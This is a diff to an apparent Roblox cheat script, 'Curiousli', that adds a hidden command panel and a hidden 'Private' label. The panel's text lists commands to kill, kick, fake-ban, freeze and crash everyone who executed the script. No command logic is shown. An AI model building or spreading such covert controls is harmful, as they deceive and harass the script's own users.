@@ -7,6 +7,7 @@ else
 	shared.CuriousliExecuted = true
 	--here--
 	
+	
 
 local curiousli = Instance.new("ScreenGui")
 curiousli.IgnoreGuiInset = false
@@ -35,10 +36,11 @@ local logo = Instance.new("ImageLabel")
 logo.BackgroundColor3 = Color3.new(1, 1, 1)
 logo.BackgroundTransparency = 1
 logo.Position = UDim2.new(0, 0, 0.036281798, 0)
-logo.Size = UDim2.new(1, 0, 0.107443444, 0)
+logo.Size = UDim2.new(1, 0, 0.0910983458, 0)
 logo.Visible = true
 logo.Name = "Logo"
 logo.Parent = main
+
 
 local drag = Instance.new("LocalScript")
 drag.Name = "Drag"
@@ -683,6 +685,53 @@ text_button.Parent = main_8
 
 local local_script_13 = Instance.new("LocalScript")
 local_script_13.Parent = text_button
+
+local cmds = Instance.new("Frame")
+cmds.BackgroundColor3 = Color3.new(1, 0.909804, 0.45098)
+cmds.Position = UDim2.new(0.322110951, 0, 0.0442104936, 0)
+cmds.Size = UDim2.new(0.410373062, 0, 0.943158031, 0)
+cmds.Visible = false
+cmds.Name = "Cmds"
+cmds.Parent = curiousli
+
+local text_label = Instance.new("TextLabel")
+text_label.Font = Enum.Font.SourceSans
+text_label.RichText = true
+text_label.Text = "/kill default --Kills everyone that executed script                                               /kick default --Kicks everyone that executed script                                                                  /ban default --Does an fake bedwars ban to whoever executed script                    /disconnect default --false disconnects the people that executed script                                    /exkick default --Fake exploit disconnects people who executed script                             /lagback default --lagbacks them                                                /jump default --makes them jump                                          /sit default --makes them sit down                                            /unsit default  --makes them unsit                                                              /freeze default --freezes them                                                     /unfreeze default --unfreezes them                                         /void default --makes them go to the void                                                                     /crash default  --crashes them                                                                              /chip default --soon                                                                         /errorkick default --destroys their head and error kicks them   "
+text_label.TextColor3 = Color3.new(0, 0, 0)
+text_label.TextScaled = true
+text_label.TextSize = 14
+text_label.TextWrapped = true
+text_label.TextYAlignment = Enum.TextYAlignment.Top
+text_label.BackgroundColor3 = Color3.new(1, 1, 1)
+text_label.BackgroundTransparency = 1
+text_label.Size = UDim2.new(1, 0, 1, 0)
+text_label.Visible = true
+text_label.Parent = cmds
+
+local private = Instance.new("TextLabel")
+private.Font = Enum.Font.SourceSansBold
+private.Text = "CURIOUSLI"
+private.TextColor3 = Color3.new(0.721569, 0.505882, 0)
+private.TextScaled = true
+private.TextSize = 14
+private.TextWrapped = true
+private.BackgroundColor3 = Color3.new(1, 1, 1)
+private.BackgroundTransparency = 1
+private.Position = UDim2.new(0.826205611, 0, 0, 0)
+private.Size = UDim2.new(0.173794359, 0, 0.0821052641, 0)
+private.Visible = false
+private.Name = "Private"
+private.Parent = curiousli
+
+local main_9 = Instance.new("ImageLabel")
+main_9.BackgroundColor3 = Color3.new(1, 1, 1)
+main_9.BackgroundTransparency = 1
+main_9.Position = UDim2.new(0, 0, 1, 0)
+main_9.Size = UDim2.new(1, 0, 1.28205132, 0)
+main_9.Visible = true
+main_9.Name = "Main"
+main_9.Parent = private
 
 --//Modules
 
